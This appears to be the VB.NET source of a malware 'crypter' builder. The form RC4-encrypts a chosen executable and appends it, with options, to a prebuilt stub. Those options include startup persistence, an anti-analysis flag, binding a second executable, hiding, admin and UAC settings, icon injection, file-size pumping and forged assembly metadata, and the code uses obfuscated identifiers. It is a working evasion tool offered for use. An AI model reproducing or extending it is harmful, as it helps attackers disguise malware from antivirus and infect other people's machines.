
Imports System.IO

Imports System.Net
Imports System.Text
Imports System.Text.RegularExpressions
Imports Microsoft.VisualBasic.CompilerServices
Public Class Form1
    Dim LogsItem As New Dictionary(Of WebClient, ListViewItem)

    Dim ID As New ArrayList
    Dim SP As String()
    Dim Dzkiller As String
    Dim сvs As String
    Dim cas As Byte()
    Dim Deli25 As String
    Const Deli255 = "奧克歐文馬數本圖月瑟格大邏斯截租闕里豐埃兒會子榮拉茲小莫接取氣普戈截嗯莫浪嘛諾一節戲略姆個亞還耐如的瑪列扎奈莫兒艾庵克帕人闕"
    Dim startup, antis As Boolean
    Dim RandomClass As New Random()
    Dim Algeria As SaveFileDialog = New SaveFileDialog
    Public patth As String
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        XVisualTextBox3.Text = RandomString(RandomClass.Next(40, 50))
    End Sub
    Public Shared Function RandomString(ByVal lenght As Integer) As Object
        Dim str As String = "奧克歐文馬數本圖月瑟格大邏斯截租闕里豐埃兒會子榮拉茲小莫接取氣普戈截嗯莫浪嘛諾一節戲略姆個亞還耐如的瑪列扎奈莫兒艾庵克帕人闕"
        Dim random As System.Random = New System.Random()
        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
        Dim num As Integer = lenght
        Dim num1 As Integer = 1
        Do
            Dim num2 As Integer = random.[Next](0, 30)
            stringBuilder.Append(str.Substring(num2, 1))
            num1 = num1 + 1
        Loop While num1 <= num
        Return stringBuilder.ToString()
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles XVisualButton1.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
          {
              .Filter = "Portable Executable |*.exe"
          }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.XVisualTextBox1.Text = openFileDialog.FileName
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles XVisualButton2.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
            {
                .Filter = "Icon |*.ico"
            }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.XVisualTextBox2.Text = openFileDialog.FileName
        End If
    End Sub
    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles XVisualButton3.Click
        Dim mes As String = "nope"
        Dim delay As String = "nope"
        Dim hide As String = "nope"
        Dim file2 As String = "nope"
        Dim admin As String = "nope"
        Dim uac As String = "nope"
        Deli25 = XVisualTextBox3.Text


        If (Me.XVisualTextBox1.Text = Nothing) Then
            Interaction.MsgBox("Error, file not selected!", MsgBoxStyle.Information, Nothing)
        End If
        Try
            Using Algeria
                Algeria.Filter = "Executable Files (.exe)|*.exe"
                If (Algeria.ShowDialog = DialogResult.OK) Then
                    Dzkiller = Algeria.FileName
                    patth = Dzkiller
                Else
                    Return
                End If
            End Using
            Dim Alpha As Byte() = kfgMZvvDND(My.Computer.FileSystem.ReadAllBytes(XVisualTextBox1.Text), XVisualTextBox3.Text)
            IO.File.WriteAllBytes(Dzkiller, My.Resources.stub)
            If XVisualCheckBox1.Checked = True Then startup = True Else startup = False
            If XVisualCheckBox2.Checked Then antis = True Else antis = False
            If XVisualCheckBox3.Checked = True Then IconInjector.InjectIcon(Dzkiller, XVisualTextBox2.Text)
            If XVisualCheckBox4.Checked Then file2 = Convert.ToBase64String(File.ReadAllBytes(XVisualTextBox4.Text))
            If XVisualCheckBox5.Checked = True Then mes = XVisualTextBox5.Text
            If XVisualCheckBox6.Checked = True Then delay = XVisualTextBox6.Text
            If XVisualCheckBox7.Checked = True Then hide = "True"
            If XVisualCheckBox11.Checked = True Then admin = "True"
            If XVisualCheckBox12.Checked = True Then uac = "True"
            File.AppendAllText(Dzkiller, Deli255 & Convert.ToBase64String(Alpha) & Deli255 & XVisualTextBox3.Text & Deli255 & startup & Deli255 & antis & Deli255 & file2 & Deli255 & mes & Deli255 & delay & Deli255 & hide & Deli255 & admin & Deli255 & uac)
            If XVisualCheckBox8.Checked Then
                File.AppendAllText(Dzkiller, Deli255 & RandomString(Rnd() * 100))
                Threading.Thread.Sleep(100)
                File.AppendAllText(Dzkiller, Deli255 & RandomString(Rnd() * 100))
            End If
            If XVisualCheckBox9.Checked = True Then
                Dim myFile As New FileInfo(Dzkiller)
                Dim sizeInBytes As Double = myFile.Length
                Dim filesize As Double = sizeInBytes + Val(XVisualTextBox7.Text)
                Dim filetopump = IO.File.OpenWrite(Dzkiller)
                Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
                While size < filesize
                    filetopump.WriteByte(0)
                    size += 1
                End While
                filetopump.Close()
            End If
            Threading.Thread.Sleep(200)
            If XVisualCheckBox10.Checked = True Then
                Dim verss As String = NumericUpDown1.Value.ToString & "." & NumericUpDown2.Value.ToString & "." & NumericUpDown3.Value.ToString & "." & NumericUpDown4.Value.ToString
                Call asminfo(XVisualTextBox8.Text, XVisualTextBox9.Text, XVisualTextBox10.Text, XVisualTextBox11.Text, XVisualTextBox12.Text, XVisualTextBox14.Text, verss)
            End If

            Interaction.MsgBox("Encryption Successful!", MsgBoxStyle.Information, Nothing)
        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            Interaction.MsgBox("Error !!!!", MsgBoxStyle.Critical, Nothing)
            ProjectData.ClearProjectError()
        End Try
        Threading.Thread.Sleep(100)

    End Sub







    Private Sub XVisualButton4_Click(sender As Object, e As EventArgs)
        End
    End Sub

    Private Sub XVisualCheckBox3_CheckedChanged(sender As Object) Handles XVisualCheckBox3.CheckedChanged
        If XVisualCheckBox3.Checked = True Then
            XVisualButton2.Enabled = True
            XVisualTextBox2.Enabled = True
        Else
            XVisualButton2.Enabled = False
            XVisualTextBox2.Enabled = False
        End If

    End Sub

    Private Sub XVisualCheckBox4_CheckedChanged(sender As Object) Handles XVisualCheckBox4.CheckedChanged
        If XVisualCheckBox4.Checked = True Then
            XVisualButton5.Enabled = True
            XVisualTextBox4.Enabled = True
        Else
            XVisualButton5.Enabled = False
            XVisualTextBox4.Enabled = False
        End If
    End Sub

    Private Sub XVisualButton5_Click(sender As Object, e As EventArgs) Handles XVisualButton5.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
         {
             .Filter = "Portable Executable |*.exe"
         }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.XVisualTextBox4.Text = openFileDialog.FileName
        End If
    End Sub
#Region "check"
    Private Sub XVisualButton6_Click(sender As Object, e As EventArgs) Handles XVisualButton6.Click
        XVisualTextBox3.Text = RandomString(40)
    End Sub

    Private Sub XVisualButton7_Click(sender As Object, e As EventArgs) Handles XVisualButton7.Click
        End
    End Sub

    Private Sub XVisualCheckBox6_CheckedChanged(sender As Object) Handles XVisualCheckBox6.CheckedChanged
        If XVisualCheckBox6.Checked = True Then XVisualTextBox6.Enabled = True Else XVisualTextBox6.Enabled = False
    End Sub

    Private Sub XVisualCheckBox5_CheckedChanged(sender As Object) Handles XVisualCheckBox5.CheckedChanged
        If XVisualCheckBox5.Checked = True Then XVisualTextBox5.Enabled = True Else XVisualTextBox5.Enabled = False
    End Sub

    Private Sub XVisualCheckBox9_CheckedChanged(sender As Object) Handles XVisualCheckBox9.CheckedChanged
        If XVisualCheckBox9.Checked = True Then XVisualTextBox7.Enabled = True Else XVisualTextBox7.Enabled = False
    End Sub

    Private Sub XVisualButton4_Click_1(sender As Object, e As EventArgs) Handles XVisualButton4.Click
        Dim openFileDialog As System.Windows.Forms.OpenFileDialog = New System.Windows.Forms.OpenFileDialog() With
         {
             .Filter = "Portable Executable |*.exe"
         }
        If (openFileDialog.ShowDialog() = DialogResult.OK) Then
            Me.XVisualTextBox13.Text = openFileDialog.FileName
        End If
        Call ReadAssembly(XVisualTextBox13.Text)
        Dim V1, V2, V3, V4 As Integer
        V1 = info(7)
        V2 = info(8)
        V3 = info(9)
        V4 = info(10)

        XVisualTextBox8.Text = info(1) : XVisualTextBox9.Text = info(2) : XVisualTextBox10.Text = info(3) : XVisualTextBox11.Text = info(4) : XVisualTextBox12.Text = info(5) : XVisualTextBox14.Text = info(6) : Me.NumericUpDown1.Text = V1 : Me.NumericUpDown2.Text = V2 : Me.NumericUpDown3.Text = V3 : Me.NumericUpDown4.Text = V4
    End Sub

    Private Sub XVisualButton8_Click(sender As Object, e As EventArgs) Handles XVisualButton8.Click
        Form2.Show()

    End Sub

    Private Sub XVisualTheme1_Click(sender As Object, e As EventArgs) Handles XVisualTheme1.Click

    End Sub

    Private Sub XVisualButton9_Click(sender As Object, e As EventArgs) Handles XVisualButton9.Click
        NotifyIcon1.Visible = True
        Me.Hide()
    End Sub

    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
        Me.Show()
        NotifyIcon1.Visible = False
    End Sub




#End Region
    Public Function kfgMZvvDND(ByVal IwEjXWlYGV As Byte(), ByVal HJTmCYrlKp As String) As Byte()
        Dim NdfDdRYKOH As Byte() = System.Text.Encoding.ASCII.GetBytes(HJTmCYrlKp)
        Dim utjCmkUcca, VuazNJTUMw, lMStAuFrkO As UInteger
        Dim uQxmFluoej As UInteger() = New UInteger(255) {}
        Dim rlcbVnVPNC As Byte() = New Byte(IwEjXWlYGV.Length - 1) {}
        For i = 0 To 255
            uQxmFluoej(i) = i
        Next
        For i = 0 To 255
            VuazNJTUMw = (VuazNJTUMw + NdfDdRYKOH(i Mod NdfDdRYKOH.Length) + uQxmFluoej(i)) And 255
            lMStAuFrkO = uQxmFluoej(i)
            uQxmFluoej(i) = uQxmFluoej(VuazNJTUMw)
            uQxmFluoej(VuazNJTUMw) = lMStAuFrkO
        Next
        utjCmkUcca = 0 : VuazNJTUMw = 0
        Dim c As Integer
        For c = 0 To rlcbVnVPNC.Length - 1
            utjCmkUcca = (utjCmkUcca + 1) And 255
            VuazNJTUMw = (VuazNJTUMw + uQxmFluoej(utjCmkUcca)) And 255
            lMStAuFrkO = uQxmFluoej(utjCmkUcca)
            uQxmFluoej(utjCmkUcca) = uQxmFluoej(VuazNJTUMw)
            uQxmFluoej(VuazNJTUMw) = lMStAuFrkO
            rlcbVnVPNC(c) = IwEjXWlYGV(c) Xor uQxmFluoej((uQxmFluoej(utjCmkUcca) + uQxmFluoej(VuazNJTUMw)) And 255)
        Next
        Return rlcbVnVPNC
    End Function

End Class
